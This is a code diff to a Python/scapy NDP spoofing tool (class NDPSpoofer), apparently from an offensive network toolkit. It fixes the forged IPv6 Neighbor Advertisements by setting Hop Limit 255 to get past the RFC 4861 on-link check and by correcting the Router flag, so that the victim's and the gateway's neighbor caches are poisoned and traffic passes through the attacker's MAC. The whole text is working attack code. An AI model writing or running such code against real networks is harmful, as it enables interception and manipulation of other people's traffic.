@@ -71,16 +71,24 @@ class NDPSpoofer(object):
 
             time.sleep(self.interval)
 
-    def _na(self, dst_ip, dst_mac, target_ip, lladdr):
+    def _na(self, dst_ip, dst_mac, target_ip, lladdr, router=True):
         """
         Builds an unsolicited Neighbor Advertisement (Override set) that claims
         `target_ip` is reachable at link-layer address `lladdr`, delivered to
         `dst_ip`/`dst_mac`.
+
+        Hop Limit MUST be 255: RFC 4861 (sec. 7.1.2) requires receivers to
+        silently discard any NA whose IPv6 Hop Limit is not 255 (the on-link
+        spoofing guard), and scapy defaults it to 64. Without this every spoofed
+        NA is dropped and the neighbor caches are never poisoned.
+
+        `router` sets the NA Router flag: true when the advertised target is the
+        gateway, false when it is one of the victim's own (host) addresses.
         """
         return (
             Ether(dst=dst_mac, src=self.our_mac) /
-            IPv6(src=target_ip, dst=dst_ip) /
-            ICMPv6ND_NA(tgt=target_ip, R=1, S=0, O=1) /
+            IPv6(src=target_ip, dst=dst_ip, hlim=255) /
+            ICMPv6ND_NA(tgt=target_ip, R=1 if router else 0, S=0, O=1) /
             ICMPv6NDOptDstLLAddr(lladdr=lladdr)
         )
 
@@ -98,7 +106,7 @@ class NDPSpoofer(object):
             packets.append(self._na(addr, host.mac, self.gateway_ipv6, self.our_mac))
         # Tell the router that each of the victim's addresses lives at our MAC.
         for addr in addresses:
-            packets.append(self._na(self.gateway_ipv6, self.gateway_mac, addr, self.our_mac))
+            packets.append(self._na(self.gateway_ipv6, self.gateway_mac, addr, self.our_mac, router=False))
 
         for packet in packets:
             sendp(packet, verbose=0, iface=self.interface)
@@ -114,7 +122,7 @@ class NDPSpoofer(object):
         packets = []
         for addr in addresses:
             packets.append(self._na(addr, host.mac, self.gateway_ipv6, self.gateway_mac))
-            packets.append(self._na(self.gateway_ipv6, self.gateway_mac, addr, host.mac))
+            packets.append(self._na(self.gateway_ipv6, self.gateway_mac, addr, host.mac, router=False))
 
         for packet in packets:
             sendp(packet, count=3, verbose=0, iface=self.interface)
